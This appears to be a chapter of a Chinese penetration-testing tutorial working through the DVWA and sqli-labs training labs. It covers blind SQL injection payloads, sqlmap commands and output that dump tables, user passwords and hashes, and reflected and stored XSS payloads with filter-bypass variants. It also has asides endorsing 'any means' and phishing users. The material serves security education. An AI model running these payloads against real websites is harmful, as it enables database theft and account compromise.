猜测第一张表名的第一个字符，显示结果exists，说明第一个字符为小写字母，根据前面的二分法，进行推测。

![image-20230405125335935](D:\Document\My_book\My_Books\钟全龙著\img\image-20230405125335935.png)

得出的结果为g
然后就是猜测第一章表名的第二个字符

```
payload:
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>97#

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))<122#
```

![image-20230405125534744](D:\Document\My_book\My_Books\钟全龙著\img\image-20230405125534744.png)

重复上面的步骤能够得出两张表分别为guestbook和users。

#### 猜测users表的字段

```
payload：
1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=8#

1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=7 #

1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 1,1),1))=10 #
```

第一条返回结果：

![image-20230405130157461](D:\Document\My_book\My_Books\钟全龙著\img\image-20230405130157461.png)

第二、三条返回结果：

![image-20230405130224887](D:\Document\My_book\My_Books\钟全龙著\img\image-20230405130224887.png)

以此类推，后面得到的字段长度为
7,10,9,4,8,6,10,12

接下来就是猜字段名字

```
payload：
1' and ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1,1))=117 #

1' and ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit 1,1),1,1))=102 #

```

返回结果：

![image-20230405130516339](D:\Document\My_book\My_Books\钟全龙著\img\image-20230405130516339.png)

以此类推，第二个字段名为first_name

后续的字段名可以使用相同的方法进行猜测，分别为user_id,first_name,last_name,user,password,avater,last_login,falied_login

#### 猜测字段内的具体内容

```
payload：
1' and ascii(substr((select user from dvwa.users limit 0,1),1,1))=97 #
```

猜测user列下的第一个字符，显示结果为exists，说明为a

后续类似，最终结果为admin

password字段存放的为加密后的数据，所以不好进行猜测，必须通过加密特征来猜测密码算法，对可能的密码算法进行尝试暴力破解，如果使用的密码算法过于复杂，短时间内不能破解，那就，别管了。

---

### SQL injection Blind Middle

#### 使用sqlmap进行盲注

调整安全级别

![image-20230530085942693](D:\Document\My_book\My_Books\钟全龙著\img\image-20230530085942693.png)

首先抓取数据包，使用sqlmap可以达到事半功倍的效果，只要能攻破网站，什么手段都可以

![image-20230530084521671](D:\Document\My_book\My_Books\钟全龙著\img\image-20230530084521671.png)

将以上内容复制下来，保存为txt文件；

![image-20230530084631740](D:\Document\My_book\My_Books\钟全龙著\img\image-20230530084631740.png)

然后使用sqlmap进行文件注入；

```shell
sqlmap -u /home/hacker/test2.txt
```

![image-20230530084805520](D:\Document\My_book\My_Books\钟全龙著\img\image-20230530084805520.png)

可以看见上面成功注入，并且给出了网站存在的注入点，都是盲注，时间盲注和布尔盲注，给出了操作系统等详细信息，使用工具到达高效率；

URL注入在这里行不通，sqlmap使用URL地址注入失败，因为过滤了网页URL地址栏的输入，所以NULL空值注入也是无法成功的。

获取当前数据库

```shell
[ BlackArch ~ ]$ sqlmap -r /home/hacker/test2.txt -current-db
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.5#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:51:09 /2023-05-30/

[08:51:09] [INFO] parsing HTTP request from '/home/hacker/test2.txt'
[08:51:09] [INFO] resuming back-end DBMS 'mysql'
[08:51:09] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8687=8687&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9836 FROM (SELECT(SLEEP(5)))hZle)&Submit=Submit
---
```

结果如下

![image-20230530085147793](D:\Document\My_book\My_Books\钟全龙著\img\image-20230530085147793.png)

#### 获取数据表

```shell
[ BlackArch ~ ]$ sqlmap -r /home/hacker/test2.txt -D dvwa --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.5#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:52:20 /2023-05-30/

[08:52:20] [INFO] parsing HTTP request from '/home/hacker/test2.txt'
[08:52:20] [INFO] resuming back-end DBMS 'mysql'
[08:52:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8687=8687&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9836 FROM (SELECT(SLEEP(5)))hZle)&Submit=Submit
---
```

结果如下：

![image-20230530085238153](D:\Document\My_book\My_Books\钟全龙著\img\image-20230530085238153.png)

#### 获取字段

获取guestbook数据表的字段信息

```shell
[ BlackArch ~ ]$ sqlmap -r /home/hacker/test2.txt -D dvwa -T guestbook --columns
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.5#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:53:21 /2023-05-30/

[08:53:21] [INFO] parsing HTTP request from '/home/hacker/test2.txt'
[08:53:21] [INFO] resuming back-end DBMS 'mysql'
[08:53:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8687=8687&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9836 FROM (SELECT(SLEEP(5)))hZle)&Submit=Submit
---
```

![image-20230530085400448](D:\Document\My_book\My_Books\钟全龙著\img\image-20230530085400448.png)

#### 查看字段内的信息

```shell
[ BlackArch ~ ]$ sqlmap -r /home/hacker/test2.txt -D dvwa -T guestbook -C name,coment,comment_id -dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:55:10 /2023-05-30/

[08:55:10] [INFO] parsing HTTP request from '/home/hacker/test2.txt'
[08:55:10] [INFO] resuming back-end DBMS 'mysql'
[08:55:10] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8687=8687&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9836 FROM (SELECT(SLEEP(5)))hZle)&Submit=Submit
---
```

结果如下：

![image-20230530085528409](D:\Document\My_book\My_Books\钟全龙著\img\image-20230530085528409.png)

---

### sqlmap的使用

![image-20230518160256010](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518160256010.png)

点击这里进入

![image-20230518160546071](D:\Document\My_book\My_Books\钟全龙著\img\image-20230518160546071.png)

这里我们不会再使用手工注入，而是使用sqlmap来进行注入；

常用的选项

```
-u 指定目标URL (可以是http协议也可以是https协议)
-d 连接数据库
--dbs 列出所有的数据库
--current-db 列出当前数据库
--tables 列出当前的表
--columns 列出当前的列
-D 选择使用哪个数据库
-T 选择使用哪个表
-C 选择使用哪个列
--dump 获取字段中的数据
--batch 自动选择yes
--smart 启发式快速判断，节约浪费时间
--forms 尝试使用post注入
-r 加载文件中的HTTP请求（本地保存的请求包txt文件）
-l 加载文件中的HTTP请求（本地保存的请求包日志文件）
-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试
-o 开启所有默认性能优化
--tamper 调用脚本进行注入
-v 指定sqlmap的回显等级
--delay 设置多久访问一次
--os-shell 获取主机shell，一般不太好用，因为没权限
-m 批量操作
-c 指定配置文件，会按照该配置文件执行动作
-data data指定的数据会当做post数据提交
-timeout 设定超时时间
--level 设置注入探测等级
--risk 风险等级
--identify-waf 检测防火墙类型
--param-del="分割符" 设置参数的分割符
--skip-urlencode 不进行url编码
--keep-alive 设置持久连接，加快探测速度
--null-connection 检索没有body响应的内容，多用于盲注
--thread 最大为10 设置多线程
```

**判断是否存在注入点**

判断可以使用那种SQL注入来进行注入

```shell
[hacker@Blackarch]-[~]
>>> sqlmap -u "http://192.168.8.121/sql-lab/Less-1/?id=1"
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:36:56 /2023-05-08/

[21:36:56] [INFO] resuming back-end DBMS 'mysql'
[21:36:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2887=2887 AND 'AvNn'='AvNn

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 9906 FROM(SELECT COUNT(*),CONCAT(0x71626a7871,(SELECT (ELT(9906=9906,1))),0x71706b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'ZKaI'='ZKaI

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6741 FROM (SELECT(SLEEP(5)))VFhU) AND 'JnUg'='JnUg

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-7696' UNION ALL SELECT NULL,NULL,CONCAT(0x71626a7871,0x57456e674756537a786a4a65727774777674726647447162576c78537375536e7a72754c524e4f4b,0x71706b7171)-- -
---
[21:36:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 7
web application technology: Apache 2.4.6, PHP 5.4.16
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[21:36:56] [INFO] fetched data logged to text files under '/home/hacker/.local/share/sqlmap/output/192.168.8.121'
[21:36:56] [WARNING] your sqlmap version is outdated

[*] ending @ 21:36:56 /2023-05-08/
```

**查询所有数据库**

```shell
[hacker@Blackarch]-[~]
>>> sqlmap --dbms="mysql" -u "http://192.168.8.121/sql-lab/Less-1/?id=1" --dbs
```

新增以下信息

```shell
[22:34:08] [WARNING] the SQL query provided does not return any output
[22:34:09] [INFO] retrieved: 'information_schema'
[22:34:09] [INFO] retrieved: 'MineCraft'
[22:34:09] [INFO] retrieved: 'ZQL'
[22:34:09] [INFO] retrieved: 'challenges'
[22:34:09] [INFO] retrieved: 'dvwa'
[22:34:09] [INFO] retrieved: 'mysql'
[22:34:09] [INFO] retrieved: 'performance_schema'
[22:34:09] [INFO] retrieved: 'security'
[22:34:09] [INFO] retrieved: 'test'
[22:34:09] [INFO] retrieved: 'web'
available databases [10]:
[*] challenges
[*] dvwa
[*] information_schema
[*] MineCraft
[*] mysql
[*] performance_schema
[*] security
[*] test
[*] web
[*] ZQL

[22:34:09] [INFO] fetched data logged to text files under '/home/hacker/.local/share/sqlmap/output/192.168.8.121'
[22:34:09] [WARNING] your sqlmap version is outdated

[*] ending @ 22:34:09 /2023-05-08/
```

**注意：将--dbs缩写成-D xxx，意思就是在xxx数据库中查询其他数据；**

**查询数据库内的表名**

```shell
[hacker@Blackarch]-[~]
>>> sqlmap --dbms="mysql" -u "http://192.168.8.121/sql-lab/Less-1/?id=1" -D security --tables
```

结果如下

```shell
[22:48:34] [INFO] fetching tables for database: 'security'
[22:48:34] [WARNING] the SQL query provided does not return any output
[22:48:34] [INFO] retrieved: 'emails'
[22:48:34] [INFO] retrieved: 'referers'
[22:48:34] [INFO] retrieved: 'uagents'
[22:48:34] [INFO] retrieved: 'users'
Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+

[22:48:34] [INFO] fetched data logged to text files under '/home/hacker/.local/share/sqlmap/output/192.168.8.121'
[22:48:34] [WARNING] your sqlmap version is outdated

[*] ending @ 22:48:34 /2023-05-08/
```

**注意：将--tables缩写成-T 表名**

**获取表中的字段**

```shell
[hacker@Blackarch]-[~]
>>> sqlmap --dbms="mysql" -u "http://192.168.8.121/sql-lab/Less-1/?id=1" -D security -T users --columns
```

结果如下

```shell
[22:56:01] [INFO] fetching columns for table 'users' in database 'security'
[22:56:01] [WARNING] the SQL query provided does not return any output
[22:56:01] [INFO] retrieved: 'id'
[22:56:01] [INFO] retrieved: 'int(3)'
[22:56:01] [INFO] retrieved: 'username'
[22:56:01] [INFO] retrieved: 'varchar(20)'
[22:56:01] [INFO] retrieved: 'password'
[22:56:01] [INFO] retrieved: 'varchar(20)'
Database: security
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+

[22:56:01] [INFO] fetched data logged to text files under '/home/hacker/.local/share/sqlmap/output/192.168.8.121'
[22:56:01] [WARNING] your sqlmap version is outdated

[*] ending @ 22:56:01 /2023-05-08/
```

这不仅能看到字段，还能看到字段的属性

**注意：将--columns缩写成-C 字段名**

**获取表中字段内的信息**

```shell
[hacker@Blackarch]-[~]
>>> sqlmap --dbms="mysql" -u "http://192.168.8.121/sql-lab/Less-1/?id=1" -D security -T users -C userna
me,password --dump
```

结果如下

```shell
[22:59:43] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'security'
[22:59:43] [WARNING] the SQL query provided does not return any output
[22:59:43] [INFO] retrieved: 'admin'
[22:59:43] [INFO] retrieved: 'admin'
[22:59:43] [INFO] retrieved: 'admin1'
[22:59:43] [INFO] retrieved: 'admin1'
[22:59:43] [INFO] retrieved: 'admin2'
[22:59:43] [INFO] retrieved: 'admin2'
[22:59:43] [INFO] retrieved: 'admin3'
[22:59:43] [INFO] retrieved: 'admin3'
[22:59:43] [INFO] retrieved: 'admin4'
[22:59:43] [INFO] retrieved: 'admin4'
[22:59:43] [INFO] retrieved: 'crappy'
[22:59:43] [INFO] retrieved: 'secure'
[22:59:43] [INFO] retrieved: 'Dumb'
[22:59:43] [INFO] retrieved: 'Dumb'
[22:59:43] [INFO] retrieved: 'dumbo'
[22:59:43] [INFO] retrieved: 'dhakkan'
[22:59:43] [INFO] retrieved: 'genious'
[22:59:43] [INFO] retrieved: 'superman'
[22:59:43] [INFO] retrieved: 'I-kill-you'
[22:59:43] [INFO] retrieved: 'Angelina'
[22:59:43] [INFO] retrieved: 'mob!le'
[22:59:43] [INFO] retrieved: 'batman'
[22:59:43] [INFO] retrieved: 'p@ssword'
[22:59:43] [INFO] retrieved: 'Dummy'
[22:59:43] [INFO] retrieved: 'stupidity'
[22:59:43] [INFO] retrieved: 'stupid'
Database: security
Table: users
[13 entries]
+----------+------------+
| username | password   |
+----------+------------+
| admin    | admin      |
| admin1   | admin1     |
| admin2   | admin2     |
| admin3   | admin3     |
| admin4   | admin4     |
| secure   | crappy     |
| Dumb     | Dumb       |
| dhakkan  | dumbo      |
| superman | genious    |
| Angelina | I-kill-you |
| batman   | mob!le     |
| Dummy    | p@ssword   |
| stupid   | stupidity  |
+----------+------------+

[22:59:43] [INFO] table 'security.users' dumped to CSV file '/home/hacker/.local/share/sqlmap/output/192.168.8.121/dump/security/users.csv'
[22:59:43] [INFO] fetched data logged to text files under '/home/hacker/.local/share/sqlmap/output/192.168.8.121'
[22:59:43] [WARNING] your sqlmap version is outdated

[*] ending @ 22:59:43 /2023-05-08/
```

这可比手工注入效率高，而且信息更多

**获取数据库的所有用户**

```shell
[hacker@Blackarch]-[~]
>>> sqlmap -u "http://192.168.8.121/sql-lab/Less-1/?id=1" --users
```

```shell
database management system users [8]:
[*] ''@'centos7'
[*] ''@'localhost'
[*] 'dvwa'@'%'
[*] 'dvwa'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'::1'
[*] 'root'@'centos7'
[*] 'root'@'localhost'

[23:03:14] [INFO] fetched data logged to text files under '/home/hacker/.local/share/sqlmap/output/192.168.8.121'
[23:03:14] [WARNING] your sqlmap version is outdated

[*] ending @ 23:03:14 /2023-05-08/
```

**获取数据库的所有用户密码**

```shell
[hacker@Blackarch]-[~]
>>> sqlmap -u "http://192.168.8.121/sql-lab/Less-1/?id=1" --passwords
```

```shell
database management system users password hashes:
[*] dvwa [1]:
    password hash: *A4B6157319038724E3560894F7F932C8886EBFCF
[*] root [2]:
    password hash: *CEFE1133B01A4A8E81B74E45883F8056BD67FB2C
    password hash: NULL

[23:05:21] [INFO] fetched data logged to text files under '/home/hacker/.local/share/sqlmap/output/192.168.8.121'
[23:05:21] [WARNING] your sqlmap version is outdated

[*] ending @ 23:05:21 /2023-05-08/
```

**获取当前网站数据库的名称**

```shell
[hacker@Blackarch]-[~]
>>> sqlmap -u "http://192.168.8.121/sql-lab/Less-1/?id=1" --current-db
```

```shell
[23:07:21] [INFO] fetching current database
current database: 'security'
[23:07:21] [INFO] fetched data logged to text files under '/home/hacker/.local/share/sqlmap/output/192.168.8.121'
[23:07:21] [WARNING] your sqlmap version is outdated

[*] ending @ 23:07:21 /2023-05-08/
```

**获取当前网站数据库用户名**

```shell
[hacker@Blackarch]-[~]
>>> sqlmap -u "http://192.168.8.121/sql-lab/Less-1/?id=1" --current-user
```

```shell
[23:09:01] [INFO] fetching current user
current user: 'root@localhost'
[23:09:01] [INFO] fetched data logged to text files under '/home/hacker/.local/share/sqlmap/output/192.168.8.121'
[23:09:01] [WARNING] your sqlmap version is outdated

[*] ending @ 23:09:01 /2023-05-08/
```

----

### sqlmap文件注入

**寻找注入点**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/test.txt
```

**查看所有的数据库**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/test.txt --dbs
```

**查看当前的数据库**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/test.txt --current-db
```

**查看当前数据库下的数据表**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/test.txt -D security --tables
```

**获取字段**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/test.txt -D security -T users --columns
```

**获取字段内的信息**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/test.txt -D security -T users -C password,username --dump
```

---

### request请求注入

**寻找注入点**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/a1.txt --technique "U" -v 3
```

**获取所有的数据库**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/a1.txt --technique "U" -v 3 --dbs
```

**获取当前数据库**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/a1.txt --technique "U" -v 3 --current-db
```

**获取当前数据表**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/a1.txt --technique "U" -v 3 -D security --tables
```

**获取当前表内的字段**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/a1.txt --technique "U" -v 3 -D security -T users --columns
```

**获取表内的字段信息**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -r /home/zql/Documents/a1.txt --technique "U" -v 3 -D security -T users -C password,username --dump
```

---

### Cookie注入

**寻找注入点**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -u "http://192.168.8.121/dvwa/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie "security=low; PHPSESSID=0s9ovm3mjc5q0ml922oi63oec4"
```

**获取所有数据库**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -u "http://192.168.8.121/dvwa/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie "security=low; PHPSESSID=0s9ovm3mjc5q0ml922oi63oec4" --dbs
```

**获取当前的数据库**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -u "http://192.168.8.121/dvwa/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie "security=low; PHPSESSID=0s9ovm3mjc5q0ml922oi63oec4" --current-db
```

**获取数据表**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -u "http://192.168.8.121/dvwa/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie "security=low; PHPSESSID=0s9ovm3mjc5q0ml922oi63oec4" -D security --tables
```

**获取字段**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -u "http://192.168.8.121/dvwa/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie "security=low; PHPSESSID=0s9ovm3mjc5q0ml922oi63oec4" -D security -T users --columns
```

**获取字段内的信息**

```shell
┌──(zql㉿kali)-[~]
└─$ sqlmap -u "http://192.168.8.121/dvwa/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie "security=low; PHPSESSID=0s9ovm3mjc5q0ml922oi63oec4" -D security -T users -C username,password --dump
```

**以上是sqlmap的基本用法，推荐在靶场sqli-labs中来进行练习，sqli-labs的通关教程正在编写，其中会通过sqlmap来进行注入，我们通过DVWA来练习手工注入，通过sqli-labs来练习sqlmap自动化工具的使用。**

![image-20230519132355165](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519132355165.png)

这就是靶场sqli-labs

---

## XSS反射型注入通关

### 简介

反射型XSS(非持久型)通过GET和POST方法，向服务器端输入数据。用户输入的数据通常被放置在 URL中，或者是form数据中。如果服务器端对输入的数据不进行过滤，验证或编码，攻击者注入恶意代码后，会直接然会响应页面，XSS攻击代码会被传输到用户的浏览器，从而触发反射型XSS。

> ##### 怎么理解？
>
> 这相当于借刀杀人，我攻击服务器，借助用户这个跳板来对用户进行攻击，我们的目的是服务器，杀人的武器就是这个用户，大致就是这样。

**反射型的特点**

- 非持久性
- 参数型脚本
- 反射型XSS的js代码在web应用的参数中，例如搜索框

---

### XSS(Reflected) Low

假如我是攻击者，我要如何才能让用户中招(感染恶意代码)，利用人的好奇心，仿造一封邮件、或者某个网页来钓鱼，我们可以通过邮件的形式发送给用户，让用户来点击有点内的恶意代码，从而用户主机会被我们控制，此时用户访问某个网页的时候会向服务器发送请求，服务器如果没有严格的过滤输出在用户的浏览器中，当服务器会做出响应后，我也能拿到用户的验证，从而的登陆用户账号，对浏览器放置恶意程序。

![image-20230507132115997](D:\Document\My_book\My_Books\钟全龙著\img\image-20230507132115997.png)

见框就插，修改URL参数，常见的测试有这些：

```javascript
//经典测试
<script>alert('hack')</script>
//大写绕过
<SCRIPT>alert('hack')</SCRIPT>
//双重绕过
<scr<script>ipt>alert('hack')</script>
//其他标签
<img src=1 onerror=alert('hack') />
```

以DVWA的XSS（Reflected）为例来进行打靶注入还是熟悉的老配方

![image-20230507132834657](D:\Document\My_book\My_Books\钟全龙著\img\image-20230507132834657.png)

看见输入框没有，养成习惯，有框就插入，给你输入的机会就一定存在注入漏洞，sql、xss、commend等方式都可以进行注入

正常情况下人们会输入的都是字符，数字，基本上都是自己想要搜索的信息，黑客就是利用这一点来输入代码进行注入

我们尝试插入这句话：

```javascript
<scrpit>alert('Hello World')</script>
```

返回的结果是这样的：

![image-20230507133313903](D:\Document\My_book\My_Books\钟全龙著\img\image-20230507133313903.png)

成功的返回了我们注入的信息，说明该网站没有对网站进行过滤，让我们有机可乘

> **注意：在javascript中，alert的用法是“alert(在对话框中显示的纯文本)”。alert方法用于显示带有一条指定消息和一个OK按钮的警告框，可以用来向用户警示信息，也可以用来调试程序。**

看看网站的源码来进行分析：

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?> 
```

这里很明显，没有进行关键字或其他敏感字符的过滤，就只是一个简单的获取数据，执行操作

```javascript
<script>alert('doucument.cookie')</script>
```

![image-20230507134113274](D:\Document\My_book\My_Books\钟全龙著\img\image-20230507134113274.png)

使用xss漏洞访问其他网站**（钓鱼）**

```javascript
<iframe src="https://www.cvedetails.com/index.php" name="iframe a" width=1500px" height= "9000px'"> <iframe>/iframe
```

![image-20230507135330782](D:\Document\My_book\My_Books\钟全龙著\img\image-20230507135330782.png)

此时网站上出现了新的也买你，像不像流氓广告？

还可以利用URL进行注入，因为URL地址栏也是一个可以输入的地址栏

```
URL编码注入：
http://192.168.8.121/dvwa/DVWA-master/vulnerabilities/xss_r/?name=%3Cscrpit%3Ealert%28%27Hello%20World%27%29%3C/script%3E
```

![image-20230507135953677](D:\Document\My_book\My_Books\钟全龙著\img\image-20230507135953677.png)

```
直接注入：
http://192.168.8.121/dvwa/DVWA-master/vulnerabilities/xss_r/?name=<scrpit>alert('Hello World')</script>
```

![image-20230507140030689](D:\Document\My_book\My_Books\钟全龙著\img\image-20230507140030689.png)

两个返回的是同种结果，原因是：

![image-20230507140111900](D:\Document\My_book\My_Books\钟全龙著\img\image-20230507140111900.png)

我对上面的元字符进行了URL转码，当在URL地址栏输入网址的时候，URL地址栏会自动转换为URL编码，所以两个返回结果一致，编码只会对？后面的文本进行编码

![image-20230507140336956](D:\Document\My_book\My_Books\钟全龙著\img\image-20230507140336956.png)

当你输入上面这句语句的时候返回以下信息，就更加证实这个网站没有任何过滤和安全机制

---

### XSS(Reflected) MIddle

首先先尝常规的注入方法能不能进行注入

```javascript
<script>alert('Hello World')</script>
```

![image-20230509225220224](D:\Document\My_book\My_Books\钟全龙著\img\image-20230509225220224.png)

很明显这里进行了一些安全设置，如果没有进行任务设置，页面会弹出一个警告框或者提示信息，而这里没有返回信息内的内容，而夹杂了部分代码格式，表示网站做出了一定的安全策略；

尝试使用一些安全绕过方式，可以使用**大小写转换、引号的使用、重写、编码绕过、使用/代替空格，使用制表符、换行符和回车符；**

#### 大小写绕过攻击

尝试使用大小写绕过

```javascript
<SCRIPT>alert("Hello Word")</script>
```

![image-20230510083329546](D:\Document\My_book\My_Books\钟全龙著\img\image-20230510083329546.png)

![image-20230510083345041](D:\Document\My_book\My_Books\钟全龙著\img\image-20230510083345041.png)

此时弹出了alert的提示框，说明我们的注入生效了，这里没有过滤大小写字符，这里就实现了绕过攻击；

这里可以尝试其他的绕过方法，这里不做过多赘述；

---

### XSS(Reflected) High

高级的注入，我们直接绕过攻击，普通的攻击坑定行不通；

尝试使用大小写绕过攻击

```javascript
<SCRIPT>alert("Hello Word")</script>
```

![image-20230510083755379](D:\Document\My_book\My_Books\钟全龙著\img\image-20230510083755379.png)

返回结果里面多了一个>，而且还没有提示框，极有可能是做了转义字符的安全操作，转义的绕过方法就是编码注入和重写绕过；

#### 编码注入

注意：只有以下属性能够进行编码

```javascript
href=
action=
formaction=
location=
on*=
name=
background=
poster=
src=
code=
data= //只支持base64
```

下面这种方式是不是怪怪的，是无法注入的；

```javascript
<scrpit>alert('Hello World')</script>
0x3c7363727069743ealert('Hello World')</script>
<scrpit>alert('Hello World')0x3c/script0x3e
```

我们不推荐使用这种双标签，推荐使用单标签，并不是说双标签不能注入，而是多点字符，容易出错，单标签能插入数据的有这种，图片<img>以及及不常用的<iframe>

```javascript
<img src="x" onerror="alert%28%22Hello%20World%22%29" >
```

![image-20230510091552997](D:\Document\My_book\My_Books\钟全龙著\img\image-20230510091552997.png)

这里我们将其编码成了URL注入成功了，可以尝试Base64等其他的编码方式；

## XSS存储型注入通关

### XSS-Stored Low

服务端的核心代码

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
// Get input
$message = trim( $_POST[ 'mtxMessage' ] );
$name = trim( $_POST[ 'txtName' ] );
// Sanitize message input
$message = stripslashes( $message );
$message = mysql_real_escape_string( $message );
// Sanitize name input
$name = mysql_real_escape_string( $name );
// Update database
$query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$mes
sage', '$name' );";
$result = mysql_query( $query ) or die( '<pre>' . mysql_error() .
'</pre>' );
//mysql_close();
}
?>
```

通常情况下我们是拿不到网站的后台代码的，所以这个代码仅供把靶场打靶，我们这里讲实际思路，看不到代码但是可以看到数据包，所以我们需要通过数据包来进行分析；

![image-20230510125854055](D:\Document\My_book\My_Books\钟全龙著\img\image-20230510125854055.png)

养成习惯，见框就插，这一定会存在注入漏洞；

name随便输入即可，messenger里填写恶意的js代码；

![image-20230519134633203](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519134633203.png)

返回结果如下：

![image-20230519134654779](D:\Document\My_book\My_Books\钟全龙著\img\image-20230519134654779.png)

